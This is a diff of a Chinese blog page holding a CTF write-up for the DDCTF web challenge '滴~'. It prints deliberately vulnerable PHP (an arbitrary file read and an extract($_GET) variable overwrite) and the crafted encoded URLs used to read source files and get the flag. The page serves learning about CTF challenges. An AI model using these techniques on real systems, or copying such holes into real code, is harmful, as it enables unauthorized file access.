@@ -1,676 +1,483 @@
 <!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>DDCTF 部分题目 Writeup - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
 
 
 
 
-
-<html lang="Chinese">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
-  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
-
-<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+<meta name="description" content="Share learn & Share life.">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<meta name="keywords" content="Threezh1">
 
 
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.3.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Kopieren',
-      copy_success: 'Kopiert',
-      copy_failure: 'Kopieren fehlgeschlagen'
-    }
-  };
-</script>
 
-  <meta name="description" content="这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。 Web - 滴~地址：http://117.51.150.246/ BASE64解码两次jpg参数的值：666C61672E6A7067 再经过一次16进制转字符串：flag.jpg 可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。 尝试读取index.php: http://117.51.150.2">
-<meta name="keywords" content="Writeup">
+    <meta name="description" content="&amp;#x8FD9;&amp;#x6B21;DDCTF&amp;#x771F;&amp;#x7684;&amp;#x662F;&amp;#x5B66;&amp;#x5230;&amp;#x5F88;&amp;#x591A;&amp;#x4E1C;&amp;#x897F;&amp;#xFF0C;&amp;#x5E0C;&amp;#x671B;&amp;#x540E;&amp;#x9762;&amp;#x53EF;&amp;#x4EE5;&amp;#x591A;&amp;#x591A;&amp;#x53C2;&amp;#x52A0;&amp;#x6BD4;&amp;#x8D5B;&amp;#x">
+<meta name="keywords" content="CTF,Writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DDCTF 部分题目 Writeup">
 <meta property="og:url" content="http://yoursite.com/2019/04/19/DDCTF 部分Writeup/index.html">
 <meta property="og:site_name" content="Threezh1&#39;s blog">
-<meta property="og:description" content="这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。 Web - 滴~地址：http://117.51.150.246/ BASE64解码两次jpg参数的值：666C61672E6A7067 再经过一次16进制转字符串：flag.jpg 可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。 尝试读取index.php: http://117.51.150.2">
+<meta property="og:description" content="&amp;#x8FD9;&amp;#x6B21;DDCTF&amp;#x771F;&amp;#x7684;&amp;#x662F;&amp;#x5B66;&amp;#x5230;&amp;#x5F88;&amp;#x591A;&amp;#x4E1C;&amp;#x897F;&amp;#xFF0C;&amp;#x5E0C;&amp;#x671B;&amp;#x540E;&amp;#x9762;&amp;#x53EF;&amp;#x4EE5;&amp;#x591A;&amp;#x591A;&amp;#x53C2;&amp;#x52A0;&amp;#x6BD4;&amp;#x8D5B;&amp;#x">
 <meta property="og:locale" content="Chinese">
 <meta property="og:image" content="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg">
 <meta property="og:image" content="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg">
 <meta property="og:image" content="https://i.loli.net/2019/04/19/5cb9c9ab02154.jpg">
-<meta property="og:updated_time" content="2019-08-23T06:17:07.994Z">
+<meta property="og:updated_time" content="2020-02-12T14:04:04.889Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DDCTF 部分题目 Writeup">
-<meta name="twitter:description" content="这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。 Web - 滴~地址：http://117.51.150.246/ BASE64解码两次jpg参数的值：666C61672E6A7067 再经过一次16进制转字符串：flag.jpg 可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。 尝试读取index.php: http://117.51.150.2">
+<meta name="twitter:description" content="&amp;#x8FD9;&amp;#x6B21;DDCTF&amp;#x771F;&amp;#x7684;&amp;#x662F;&amp;#x5B66;&amp;#x5230;&amp;#x5F88;&amp;#x591A;&amp;#x4E1C;&amp;#x897F;&amp;#xFF0C;&amp;#x5E0C;&amp;#x671B;&amp;#x540E;&amp;#x9762;&amp;#x53EF;&amp;#x4EE5;&amp;#x591A;&amp;#x591A;&amp;#x53C2;&amp;#x52A0;&amp;#x6BD4;&amp;#x8D5B;&amp;#x">
 <meta name="twitter:image" content="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg">
-  <link rel="canonical" href="http://yoursite.com/2019/04/19/DDCTF 部分Writeup/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
-
-  <title>DDCTF 部分题目 Writeup | Threezh1's blog</title>
-  <meta name="generator" content="Hexo 3.8.0">
-  
-
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
 
 
 
 
 
+<link rel="icon" href="/favicon.png">
 
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
 
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Threezh1's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/About">关于</a>
+            
+            <a class="navbar-item " href="http://119.3.219.188/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Buscar" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
     </div>
-        <p class="site-subtitle">分享学习、分享想法</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
-        <li class="menu-item menu-item-home">
-      
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-archives">
-      
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-threeday">
-      
-    
-
-    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
-
-  </li>
-  </ul>
-
 </nav>
-</div>
-    </header>
 
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            DDCTF 部分题目 Writeup
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2019-04-19T04:00:00.000Z" itemprop="datePublished">Apr 19 2019</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
             
-
-          <div id="content" class="content page-post-detail">
             
-
-  <div id="posts" class="posts-expand">
+            12 minutes de lectura (Alrededor de 1785 palabras)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/19/DDCTF 部分Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Threezh1">
-      <meta itemprop="description" content="Share learn & Share life.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Threezh1's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">DDCTF 部分题目 Writeup
-
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Veröffentlicht am</span>
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-04-19 12:00:00" itemprop="dateCreated datePublished" datetime="2019-04-19T12:00:00+08:00">2019-04-19</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="Geändert am: 2019-08-23 14:17:07" itemprop="dateModified" datetime="2019-08-23T14:17:07+08:00">2019-08-23</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">in</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <p><em>这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。</em></p>
-<h2 id="Web-滴"><a href="#Web-滴" class="headerlink" title="Web - 滴~"></a>Web - 滴~</h2><p>地址：<a href="http://117.51.150.246/" target="_blank" rel="noopener">http://117.51.150.246/</a></p>
-<p>BASE64解码两次jpg参数的值：666C61672E6A7067</p>
-<p>再经过一次16进制转字符串：flag.jpg</p>
-<p>可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。</p>
-<p>尝试读取index.php:</p>
+        <p><em>&#x8FD9;&#x6B21;DDCTF&#x771F;&#x7684;&#x662F;&#x5B66;&#x5230;&#x5F88;&#x591A;&#x4E1C;&#x897F;&#xFF0C;&#x5E0C;&#x671B;&#x540E;&#x9762;&#x53EF;&#x4EE5;&#x591A;&#x591A;&#x53C2;&#x52A0;&#x6BD4;&#x8D5B;&#x953B;&#x70BC;&#x81EA;&#x5DF1;&#x3002;</em></p>
+<h2 id="Web-&#x6EF4;"><a href="#Web-&#x6EF4;" class="headerlink" title="Web - &#x6EF4;~"></a>Web - &#x6EF4;~</h2><p>&#x5730;&#x5740;&#xFF1A;<a href="http://117.51.150.246/" target="_blank" rel="noopener">http://117.51.150.246/</a></p>
+<p>BASE64&#x89E3;&#x7801;&#x4E24;&#x6B21;jpg&#x53C2;&#x6570;&#x7684;&#x503C;&#xFF1A;666C61672E6A7067</p>
+<p>&#x518D;&#x7ECF;&#x8FC7;&#x4E00;&#x6B21;16&#x8FDB;&#x5236;&#x8F6C;&#x5B57;&#x7B26;&#x4E32;&#xFF1A;flag.jpg</p>
+<p>&#x53EF;&#x77E5;&#x9875;&#x9762;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;&#x662F;&#x5148;&#x7ECF;&#x8FC7;&#x4E24;&#x6B21;BASE64&#x89E3;&#x7801;&#x518D;&#x7ECF;&#x8FC7;&#x4E00;&#x6B21;&#x8FDB;&#x5236;&#x8F6C;&#x6362;&#x5F97;&#x5230;&#x7684;&#x3002;</p>
+<p>&#x5C1D;&#x8BD5;&#x8BFB;&#x53D6;index.php:</p>
 <p><code>http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p>
-<p>页面返回得到data协议里的经过BASE64处理后的数据，解码后得到源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<p>这里可以看到，$file经过的处理步骤为：</p>
+<p>&#x9875;&#x9762;&#x8FD4;&#x56DE;&#x5F97;&#x5230;data&#x534F;&#x8BAE;&#x91CC;&#x7684;&#x7ECF;&#x8FC7;BASE64&#x5904;&#x7406;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x89E3;&#x7801;&#x540E;&#x5F97;&#x5230;&#x6E90;&#x7801;&#xFF1A;<br><a id="more"></a></p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="hljs-comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="hljs-string">&apos;content-type:text/html;charset=utf-8&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>(! <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&apos;jpg&apos;</span>]))</span><br><span class="line">    header(<span class="hljs-string">&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">&apos;jpg&apos;</span>])));</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;title&gt;&apos;</span>.$_GET[<span class="hljs-string">&apos;jpg&apos;</span>].<span class="hljs-string">&apos;&lt;/title&gt;&apos;</span>;</span><br><span class="line">$file = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="hljs-keyword">echo</span> $file.<span class="hljs-string">&apos;&lt;/br&gt;&apos;</span>;</span><br><span class="line">$file = str_replace(<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>, $file);</span><br><span class="line"><span class="hljs-keyword">echo</span> $file.<span class="hljs-string">&apos;&lt;/br&gt;&apos;</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&apos;data:image/gif;base64,&quot;</span>.$txt.<span class="hljs-string">&quot;&apos;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<!-- more -->
+<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;$file&#x7ECF;&#x8FC7;&#x7684;&#x5904;&#x7406;&#x6B65;&#x9AA4;&#x4E3A;&#xFF1A;</p>
 <ol>
-<li>jpg参数的值经过两次base64加密，一次进制转换。</li>
-<li>使用preg_replace()函数将除了字母数字外的字符删除</li>
-<li>将变量中<code>config</code>替换为<code>!</code></li>
+<li>jpg&#x53C2;&#x6570;&#x7684;&#x503C;&#x7ECF;&#x8FC7;&#x4E24;&#x6B21;base64&#x52A0;&#x5BC6;&#xFF0C;&#x4E00;&#x6B21;&#x8FDB;&#x5236;&#x8F6C;&#x6362;&#x3002;</li>
+<li>&#x4F7F;&#x7528;preg_replace()&#x51FD;&#x6570;&#x5C06;&#x9664;&#x4E86;&#x5B57;&#x6BCD;&#x6570;&#x5B57;&#x5916;&#x7684;&#x5B57;&#x7B26;&#x5220;&#x9664;</li>
+<li>&#x5C06;&#x53D8;&#x91CF;&#x4E2D;<code>config</code>&#x66FF;&#x6362;&#x4E3A;<code>!</code></li>
 </ol>
-<p>题目中还给了提示<code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code></p>
-<p>看了之后我一直以为是要绕过preg_replace()提交一个<code>\b</code>来构造参数值来读取config.php，无果。</p>
-<p>后来经过别人提示才知道，博客的博主的另外一篇帖子提到的<a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">vim 异常退出 swp文件提示</a></p>
-<p>读取practice.txt.swp:</p>
+<p>&#x9898;&#x76EE;&#x4E2D;&#x8FD8;&#x7ED9;&#x4E86;&#x63D0;&#x793A;<code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code></p>
+<p>&#x770B;&#x4E86;&#x4E4B;&#x540E;&#x6211;&#x4E00;&#x76F4;&#x4EE5;&#x4E3A;&#x662F;&#x8981;&#x7ED5;&#x8FC7;preg_replace()&#x63D0;&#x4EA4;&#x4E00;&#x4E2A;<code>\b</code>&#x6765;&#x6784;&#x9020;&#x53C2;&#x6570;&#x503C;&#x6765;&#x8BFB;&#x53D6;config.php&#xFF0C;&#x65E0;&#x679C;&#x3002;</p>
+<p>&#x540E;&#x6765;&#x7ECF;&#x8FC7;&#x522B;&#x4EBA;&#x63D0;&#x793A;&#x624D;&#x77E5;&#x9053;&#xFF0C;&#x535A;&#x5BA2;&#x7684;&#x535A;&#x4E3B;&#x7684;&#x53E6;&#x5916;&#x4E00;&#x7BC7;&#x5E16;&#x5B50;&#x63D0;&#x5230;&#x7684;<a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">vim &#x5F02;&#x5E38;&#x9000;&#x51FA; swp&#x6587;&#x4EF6;&#x63D0;&#x793A;</a></p>
+<p>&#x8BFB;&#x53D6;practice.txt.swp:</p>
 <p><code>http://117.51.150.246/index.php?jpg=TnpBM01qWXhOak0zTkRZNU5qTTJOVEpsTnpRM09EYzBNbVUzTXpjM056QT0=</code></p>
-<p>获得了一个文件名：f1ag!ddctf.php 访问后发现没有东西，直接读这个文件的源码：</p>
-<p>emmm,发现<code>f1ag!ddctf.php</code>被过滤成<code>f1agddctf.php</code>，因为str_replace()会把config替换为!，所以就直接把读取的文件名设为<code>f1agconfigddctf.php</code>，成功读取到源码：</p>
+<p>&#x83B7;&#x5F97;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#xFF1A;f1ag!ddctf.php &#x8BBF;&#x95EE;&#x540E;&#x53D1;&#x73B0;&#x6CA1;&#x6709;&#x4E1C;&#x897F;&#xFF0C;&#x76F4;&#x63A5;&#x8BFB;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x6E90;&#x7801;&#xFF1A;</p>
+<p>emmm,&#x53D1;&#x73B0;<code>f1ag!ddctf.php</code>&#x88AB;&#x8FC7;&#x6EE4;&#x6210;<code>f1agddctf.php</code>&#xFF0C;&#x56E0;&#x4E3A;str_replace()&#x4F1A;&#x628A;config&#x66FF;&#x6362;&#x4E3A;!&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x76F4;&#x63A5;&#x628A;&#x8BFB;&#x53D6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x8BBE;&#x4E3A;<code>f1agconfigddctf.php</code>&#xFF0C;&#x6210;&#x529F;&#x8BFB;&#x53D6;&#x5230;&#x6E90;&#x7801;&#xFF1A;</p>
 <p><code>http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>变量覆盖，判断变量uid和文件名为变量k的文件内容是否相同。</p>
-<p>一开始想着应该是弱类型，但后来发现不是。</p>
-<p>如果文件不存在的话，读取到的内容就为空，所以uid赋值为空，k为一个不存在的文件名，访问：</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;config.php&apos;</span>);</span><br><span class="line">$k = <span class="hljs-string">&apos;hello&apos;</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($uid))</span><br><span class="line">{</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="hljs-keyword">if</span>($uid==$content)</span><br><span class="line">	{</span><br><span class="line">		<span class="hljs-keyword">echo</span> $flag;</span><br><span class="line">	}</span><br><span class="line">	<span class="hljs-keyword">else</span></span><br><span class="line">	{</span><br><span class="line">		<span class="hljs-keyword">echo</span><span class="hljs-string">&apos;hello&apos;</span>;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
